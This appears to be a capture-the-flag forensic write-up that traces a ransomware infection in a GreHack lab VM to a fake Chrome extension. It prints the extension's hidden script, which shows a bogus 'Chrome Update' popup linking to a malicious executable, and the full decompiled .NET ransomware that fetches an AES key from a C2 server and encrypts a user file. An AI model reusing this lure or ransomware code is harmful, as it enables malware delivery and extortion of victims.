# The mad hatter - Forensic Medium

To start the challenge we need to download a VMware Virtual Machine.
The user `The Mad Hatter` has been hacked by ransomware and he loose a secret video, to get the flag we can decrypt the video.

## Way 1

Open the Virtual Machine in VMware, start it and logon as `The Mad Hatter`, we can found the ransom note on the Desktop: `Your file has been encrypted. Pay 1337 beers to the GreHack staff to decrypt it !`.

We can change the `explorer.exe` configuration to print hidden files and extensions.

Now we can check processes, softwares, logs and registry keys on the machine. We can can found *Google Chrome* and found some strange URL in history and some google search like: *why chrome is so vulnerable ?*. Okay so in the history we can found the following URL: `https://i-will-pwn-your.host/static/chrome-update.exe`, and we can see the executable in Downloads but it was deleted. We can see a `html2pdf` plugin in Google Chrome.

Okay, we can search files for this chrome extension and we can found it in hidden directory: `C:\Users\The Mad Hatter\html_to_pdf`.

Now check the code, all javascript files are okay... but when we check the manifest:

```json
{
    "manifest_version": 3,
    "name": "HTML to PDF Convertor",
    "version": "1.0",
    "description": "Convert HTML page to PDF",
    "permissions": ["activeTab", "tabs", "downloads"],
    "web_accessible_resources": [
        {
          "resources": ["chrome.png"],
          "matches": ["<all_urls>"]
        }
    ],    
    "action": {
        "default_popup": "popup/popup.html",
        "default_icon": {
          "16": "pdf.png",
          "48": "pdf.png",
          "128": "pdf.png"
        }
      },
    "content_scripts": [
      {
        "matches": ["<all_urls>"],
        "js": ["content.png", "pdf.js"]
      }
    ],
    "background": {
      "service_worker": "background.js"
    }
  }

```

There is a strange `content_scripts` and `js` file: `content.png`... So open it in IDE and get the javascript code:

```js
function UpdatePopup() {
    const popupWrapper = document.createElement('div');
    popupWrapper.id = 'ChromeUpdateWrapper';
    
    popupWrapper.style.position = 'fixed';
    popupWrapper.style.top = '10px'; 
    popupWrapper.style.right = '10px'; 

    popupWrapper.style.width = '20%'; 
    popupWrapper.style.height = 'auto';

    popupWrapper.style.zIndex = 99999;
    popupWrapper.style.boxShadow = '0px 0px 10px rgba(0,0,0,0.5)';
    popupWrapper.style.borderRadius = '8px';
    popupWrapper.style.backgroundColor = '#ffffff';
    popupWrapper.style.padding = '20px';
    popupWrapper.style.textAlign = 'center';
    popupWrapper.innerHTML = `
        <img src="${chrome.runtime.getURL('chrome.png')}" width="30" style="display: block; margin: 0 auto;">
        <h3 style="color: red;">Chrome Update</h3>
        <p style="font-size: 12px; color: #666;">Critical update available.</p>
        <a target="_blank" href="https://i-will-pwn-your.host/static/chrome-update.exe" download class="updateButton">Update Now</a>
    `;

    const updateBtn = popupWrapper.querySelector('.updateButton');
    updateBtn.style.display = 'inline-block';
    updateBtn.style.padding = '8px 15px';
    updateBtn.style.marginTop = '10px';
    updateBtn.style.backgroundColor = '#4285F4';
    updateBtn.style.color = '#ffffff';
    updateBtn.style.textDecoration = 'none';
    updateBtn.style.borderRadius = '5px';
    updateBtn.style.cursor = 'pointer';
    
    updateBtn.addEventListener('click', function() {
        // Automatiquement déclenche le téléchargement
        window.location.href = "https://i-will-pwn-your.host/static/chrome-update.exe";
    });

    document.body.appendChild(popupWrapper);
}

if (Math.random() <= 0.05) {
    UpdatePopup();
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === 'getHTML') {
        sendResponse(document.documentElement.outerHTML);
    }
});
```

The malicious `chrome-update.exe` executable has been download by the `html2pdf` chrome extension.

Download the malware on https://i-will-pwn-your.host/static/chrome-update.exe.

We can use the `ProgramExecutableAnalyzer` to analyse the executable, we can identify the malware as .Net executable and reverse it with `dnSpy` to get the following code:

```c#
using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;

// Token: 0x02000002 RID: 2
internal class Program
{
    // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
    public static void Main(string[] args)
    {
        try
        {
            Program.GetKIV();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + Program.De("XHNlY3JldF92aWRlby5tcDQ=");
            string path2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + Program.De("XHJhbnNvbV9ub3RlLnR4dA==");
            if (File.Exists(path))
            {
                byte[] bytes = Program.Encrypt(File.ReadAllBytes(path), Program.k, Program.iv);
                File.WriteAllBytes(path, bytes);
                File.WriteAllText(path2, Program.De("WW91ciBmaWxlIGhhcyBiZWVuIGVuY3J5cHRlZC4gUGF5IDEzMzcgYmVlcnMgdG8gdGhlIEdyZUhhY2sgc3RhZmYgdG8gZGVjcnlwdCBpdCAh"));
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }
    }

    // Token: 0x06000002 RID: 2 RVA: 0x00002100 File Offset: 0x00000300
    public static void GetKIV()
    {
        string address = Program.De("aHR0cHM6Ly9pLXdpbGwtcHduLXlvdXIuaG9zdC80YWY1ZGEyZTllZjVlZmQzNTIwYzlhOWY0NjNkYmRlZQ==");
        string str = Program.De("YzJfbTRzdDNy");
        string str2 = Program.De("MjlhMzY3NWJjODdhZDMyODUyZjc5MzU3NDFmOGU5OGNlZTU0N2M2NQ==");
        string str3 = Convert.ToBase64String(Encoding.ASCII.GetBytes(str + ":" + str2));
        using (WebClient webClient = new WebClient())
        {
            webClient.Headers[HttpRequestHeader.Authorization] = "Basic " + str3;
            string json = webClient.DownloadString(address);
            Program.ks = Program.Extract(json, "key");
            Program.ivs = Program.Extract(json, "iv");
        }
        Program.k = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(Program.ks));
        Program.iv = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(Program.ivs));
    }

    // Token: 0x06000003 RID: 3 RVA: 0x00002200 File Offset: 0x00000400
    private static string Extract(string json, string key)
    {
        string text = "\"" + key + "\":\"";
        int num = json.IndexOf(text) + text.Length;
        int num2 = json.IndexOf("\"", num);
        return json.Substring(num, num2 - num);
    }

    // Token: 0x06000004 RID: 4 RVA: 0x0000224C File Offset: 0x0000044C
    public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
    {
        byte[] result;
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                    result = memoryStream.ToArray();
                }
            }
        }
        return result;
    }

    // Token: 0x06000005 RID: 5 RVA: 0x00002314 File Offset: 0x00000514
    private static string De(string input)
    {
        return Encoding.UTF8.GetString(Convert.FromBase64String(input));
    }

    // Token: 0x04000001 RID: 1
    private static string ks;

    // Token: 0x04000002 RID: 2
    private static byte[] k;

    // Token: 0x04000003 RID: 3
    private static string ivs;

    // Token: 0x04000004 RID: 4
    private static byte[] iv;
}
```

Reverse base64 encoded strings:

```c#
using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;

// Token: 0x02000002 RID: 2
internal class Program
{
    // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
    public static void Main(string[] args)
    {
        try
        {
            Program.GetKIV();
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\secret_video.mp4";
            string path2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\ransom_note.txt";
            if (File.Exists(path))
            {
                byte[] bytes = Program.Encrypt(File.ReadAllBytes(path), Program.k, Program.iv);
                File.WriteAllBytes(path, bytes);
                File.WriteAllText(path2, "Your file has been encrypted. Pay 1337 beers to the GreHack staff to decrypt it !");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }
    }

    // Token: 0x06000002 RID: 2 RVA: 0x00002100 File Offset: 0x00000300
    public static void GetKIV()
    {
        string address = "https://i-will-pwn-your.host/4af5da2e9ef5efd3520c9a9f463dbdee";
        string str = "c2_m4st3r";
        string str2 = "29a3675bc87ad32852f7935741f8e98cee547c65";
        string str3 = Convert.ToBase64String(Encoding.ASCII.GetBytes(str + ":" + str2));
        using (WebClient webClient = new WebClient())
        {
            webClient.Headers[HttpRequestHeader.Authorization] = "Basic " + str3;
            string json = webClient.DownloadString(address);
            Program.ks = Program.Extract(json, "key");
            Program.ivs = Program.Extract(json, "iv");
        }
        Program.k = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(Program.ks));
        Program.iv = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(Program.ivs));
    }

    // Token: 0x06000003 RID: 3 RVA: 0x00002200 File Offset: 0x00000400
    private static string Extract(string json, string key)
    {
        string text = "\"" + key + "\":\"";
        int num = json.IndexOf(text) + text.Length;
        int num2 = json.IndexOf("\"", num);
        return json.Substring(num, num2 - num);
    }

    // Token: 0x06000004 RID: 4 RVA: 0x0000224C File Offset: 0x0000044C
    public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
    {
        byte[] result;
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                    result = memoryStream.ToArray();
                }
            }
        }
        return result;
    }

    // Token: 0x06000005 RID: 5 RVA: 0x00002314 File Offset: 0x00000514
    private static string De(string input)
    {
        return Encoding.UTF8.GetString(Convert.FromBase64String(input));
    }

    // Token: 0x04000001 RID: 1
    private static string ks;

    // Token: 0x04000002 RID: 2
    private static byte[] k;

    // Token: 0x04000003 RID: 3
    private static string ivs;

    // Token: 0x04000004 RID: 4
    private static byte[] iv;
}
```

1. The executable get the key and the iv from a Web server with *Basic Authentication*.
2. Encrypt a file and write the ransom note

Now we can perform the same request as the malware to decrypt the file:

```python
from urllib.request import urlopen, Request
from base64 import b64encode
from pprint import pprint
from json import load

pprint(load(urlopen(Request("https://i-will-pwn-your.host/4af5da2e9ef5efd3520c9a9f463dbdee", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/119.0", "Authorization": f"Basic {b64encode(b'c2_m4st3r:29a3675bc87ad32852f7935741f8e98cee547c65').decode()}"}))))

# output: {'iv': '1337733113377331', 'key': '4a448c0831b578470664af35a7067315'}
# Get a 403 error code if you don't change the User-Agent
```

```
GET /4af5da2e9ef5efd3520c9a9f463dbdee HTTP/2
Host: i-will-pwn-your.host
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Authorization: Basic YzJfbTRzdDNyOjI5YTM2NzViYzg3YWQzMjg1MmY3OTM1NzQxZjhlOThjZWU1NDdjNjU=
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
TE: trailers
```

```json
{"iv":"1337733113377331","key":"4a448c0831b578470664af35a7067315"}
```

Okay now we have the key and the IV so we can decrypt the file:

```python
from hashlib import sha256, md5
print(md5(b"1337733113377331").hexdigest())
print(sha256(b"4a448c0831b578470664af35a7067315").hexdigest())

# 42672303956db092c12f6a903e6397f5
# fd2cd89620dfead0d340677122927c10fa9eb182be12c174cfec01be952915e2
```

```ps1
$bytes = [System.IO.File]::ReadAllBytes("secret_video.mp4")
$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
$aesManaged.IV = [byte[]] -split ('42672303956db092c12f6a903e6397f5' -replace '..', '0x$& ')
$aesManaged.Key = [byte[]] -split ('fd2cd89620dfead0d340677122927c10fa9eb182be12c174cfec01be952915e2' -replace '..', '0x$& ')
$decryptor = $aesManaged.CreateDecryptor()
$unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
$aesManaged.Dispose()
Set-Content video.mp4 -Value $unencryptedData -Encoding Byte
```

Use the precedent powershell code or the following C# code:

```c#
using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;

// Token: 0x02000002 RID: 2
internal class Program
{
    // Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
    public static void Main(string[] args)
    {
        try
        {
            Program.GetKIV();
            string path = "C:\\Users\\XXXXX\\Documents\\Virtual Machines\\grehack\\secret_video.mp4";
            string path2 = "C:\\Users\\XXXXX\\Documents\\Virtual Machines\\grehack\\video.mp4";
            if (File.Exists(path))
            {
                byte[] bytes = Program.Decrypt(File.ReadAllBytes(path), Program.k, Program.iv);
                File.WriteAllBytes(path2, bytes);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }
    }

    // Token: 0x06000002 RID: 2 RVA: 0x00002100 File Offset: 0x00000300
    public static void GetKIV()
    {
        string address = "https://i-will-pwn-your.host/4af5da2e9ef5efd3520c9a9f463dbdee";
        string str = "c2_m4st3r";
        string str2 = "29a3675bc87ad32852f7935741f8e98cee547c65";
        string str3 = Convert.ToBase64String(Encoding.ASCII.GetBytes(str + ":" + str2));
        using (WebClient webClient = new WebClient())
        {
            webClient.Headers[HttpRequestHeader.Authorization] = "Basic " + str3;
            string json = webClient.DownloadString(address);
            Program.ks = Program.Extract(json, "key");
            Program.ivs = Program.Extract(json, "iv");
        }
        Program.k = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(Program.ks));
        Program.iv = MD5.Create().ComputeHash(Encoding.UTF8.GetBytes(Program.ivs));
    }

    // Token: 0x06000003 RID: 3 RVA: 0x00002200 File Offset: 0x00000400
    private static string Extract(string json, string key)
    {
        string text = "\"" + key + "\":\"";
        int num = json.IndexOf(text) + text.Length;
        int num2 = json.IndexOf("\"", num);
        return json.Substring(num, num2 - num);
    }

    // Token: 0x06000004 RID: 4 RVA: 0x0000224C File Offset: 0x0000044C
    public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
    {
        byte[] result;
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                    result = memoryStream.ToArray();
                }
            }
        }
        return result;
    }

    // Token: 0x06000005 RID: 5 RVA: 0x00002314 File Offset: 0x00000514
    private static string De(string input)
    {
        return Encoding.UTF8.GetString(Convert.FromBase64String(input));
    }

    // Token: 0x04000001 RID: 1
    private static string ks;

    // Token: 0x04000002 RID: 2
    private static byte[] k;

    // Token: 0x04000003 RID: 3
    private static string ivs;

    // Token: 0x04000004 RID: 4
    private static byte[] iv;
}
```

Start the video and read the flag: `GH{fr0m_Add0n_t0_r4ns0m_!!}`

## Way 2

Open the VMDK file with `7zip` (right click -> Show more options -> 7zip -> Open archive), open the NTFS partition, and go to the `The Mad Hatter` directory, we can see all standard home directories + `html_to_pdf` directory. Copy it on your disk and analyze files, in manifest you get the malicious usage of `content.png` and you can read the malicious javascript code. Now we now how the ransomware has been downloaded.